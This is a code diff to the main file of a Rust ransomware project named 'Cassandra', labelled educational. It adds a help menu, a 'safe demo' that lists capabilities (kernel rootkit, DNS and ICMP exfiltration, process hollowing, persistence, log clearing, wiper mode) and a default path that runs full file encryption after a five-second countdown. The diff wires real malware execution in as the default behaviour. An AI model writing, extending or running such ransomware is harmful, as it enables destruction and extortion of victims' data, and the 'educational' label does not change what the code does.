@@ -19,6 +19,99 @@ use base64::{Engine, engine::general_purpose::STANDARD};
 
 include!(concat!(env!("OUT_DIR"), "/poly_key.rs"));
 
+// Show help menu
+fn show_help() {
+    println!("🎯 Cassandra Ransomware - Advanced Educational Implementation");
+    println!("========================================================");
+    println!();
+    println!("USAGE:");
+    println!("  cargo run                    # 🚨 FULL EXECUTION (DANGER!)");
+    println!("  cargo run -- --demo          # 🛡️  SAFE DEMO MODE");
+    println!("  cargo run -- --help          # 📖 Show this help");
+    println!();
+    println!("DEVELOPER OPTIONS:");
+    println!("  cargo run -- test            # 🔧 Test dropper chain only");
+    println!("  cargo run -- integration     # 🔗 Test all components");
+    println!();
+    println!("FEATURES:");
+    println!("  ✅ AI-powered file targeting");
+    println!("  ✅ Kernel-level rootkit (SSDT hooking)");
+    println!("  ✅ Multi-channel stealth C2");
+    println!("  ✅ Process injection & hollowing");
+    println!("  ✅ In-memory execution");
+    println!("  ✅ Multi-stage dropper chain");
+    println!("  ✅ Advanced self-deletion");
+    println!();
+    println!("⚠️  WARNING: This is for educational purposes only!");
+    println!("🚫 Do not run on production systems!");
+    println!("🛡️  Use --demo for safe testing");
+}
+
+// Safe demo mode - shows all features without risk
+fn run_demo_mode() {
+    println!("🎭 Starting Cassandra Ransomware Demo Mode");
+    println!("==========================================");
+
+    // 1. Show rootkit capabilities
+    println!("\n1️⃣ 🔧 ROOTKIT CAPABILITIES:");
+    println!("   • SSDT hooking for system call interception");
+    println!("   • DKOM (Direct Kernel Object Manipulation)");
+    println!("   • Dual-mode process/file hiding");
+    println!("   • Kernel driver loading simulation");
+
+    // 2. Show stealth communication
+    println!("\n2️⃣ 🌐 STEALTH COMMUNICATION:");
+    println!("   • DNS tunneling: Data hidden in DNS queries");
+    println!("   • ICMP exfiltration: Data in ping packets");
+    println!("   • Domain fronting: CDN bypass techniques");
+    println!("   • Social steganography: Data in images");
+
+    // 3. Show dropper chain
+    println!("\n3️⃣ 📦 DROPper CHAIN:");
+    println!("   • Stage 0: Office macro generation");
+    println!("   • Stage 1: Encrypted payload download");
+    println!("   • Stage 2: Process injection (regsvr32.exe)");
+    println!("   • Stage 3: Main execution with evasion");
+    println!("   • Final: Complete self-deletion");
+
+    // 4. Show AI targeting
+    println!("\n4️⃣ 🤖 AI-POWERED TARGETING:");
+    let files = traversal::get_target_files();
+    println!("   • Found {} potential target files", files.len());
+    println!("   • Would prioritize by: size, access time, file type");
+
+    // 5. Show encryption simulation
+    println!("\n5️⃣ 🔐 ENCRYPTION SIMULATION:");
+    println!("   • ChaCha20Poly1305 authenticated encryption");
+    println!("   • Hardware-bound keys (CPU + disk + BIOS)");
+    println!("   • Machine-specific decryption requirement");
+    println!("   • Parallel processing with Rayon");
+
+    // 6. Show persistence
+    println!("\n6️⃣ 🔄 PERSISTENCE MECHANISMS:");
+    println!("   • Registry run keys");
+    println!("   • Startup folder entries");
+    println!("   • Scheduled tasks");
+    println!("   • Service creation");
+
+    // 7. Show anti-forensic
+    println!("\n7️⃣ 🧹 ANTI-FORENSIC FEATURES:");
+    println!("   • Secure file deletion (3-pass overwrite)");
+    println!("   • Free space wiping");
+    println!("   • Event log clearing");
+    println!("   • Screenshot capture");
+
+    // 8. Show wiper mode
+    println!("\n8️⃣ 💣 WIPER MODE:");
+    println!("   • Deadline enforcement");
+    println!("   • Recursive file destruction");
+    println!("   • Irrecoverable deletion");
+
+    println!("\n🎉 Demo completed successfully!");
+    println!("💡 This demo shows all capabilities without any risk.");
+    println!("📚 Use 'cargo run -- --help' for more options.");
+}
+
 // Integration test function
 fn test_integration() {
     println!("🔍 Testing integration of all advanced components...");
@@ -203,8 +296,24 @@ fn basic_anti_analysis() {
 }
 
 fn main() {
-    // Check for test mode
+    // Check for command line arguments
     let args: Vec<String> = std::env::args().collect();
+
+    // Show help if requested
+    if args.len() > 1 && (args[1] == "--help" || args[1] == "-h") {
+        show_help();
+        return;
+    }
+
+    // Safe demo mode - no actual encryption
+    if args.len() > 1 && (args[1] == "--demo" || args[1] == "--safe") {
+        println!("🛡️ SAFE DEMO MODE - No files will be encrypted!");
+        println!("This mode demonstrates all features without any risk.");
+        run_demo_mode();
+        return;
+    }
+
+    // Test mode for developers
     if args.len() > 1 && args[1] == "test" {
         println!("Running in TEST MODE - No actual execution");
         if let Err(e) = dropper::test_dropper_chain() {
@@ -213,10 +322,20 @@ fn main() {
         return;
     }
 
+    // Integration test for developers
     if args.len() > 1 && args[1] == "integration" {
         println!("Running INTEGRATION TEST - Testing all components together");
         test_integration();
         return;
+    }
+
+    // Default: Full ransomware execution (DANGER!)
+    println!("🚨 WARNING: This will encrypt files on your system!");
+    println!("Press Ctrl+C within 5 seconds to cancel...");
+
+    for i in (1..=5).rev() {
+        println!("{}...", i);
+        thread::sleep(Duration::from_secs(1));
     }
 
     // Polymorphic execution order based on compile-time key
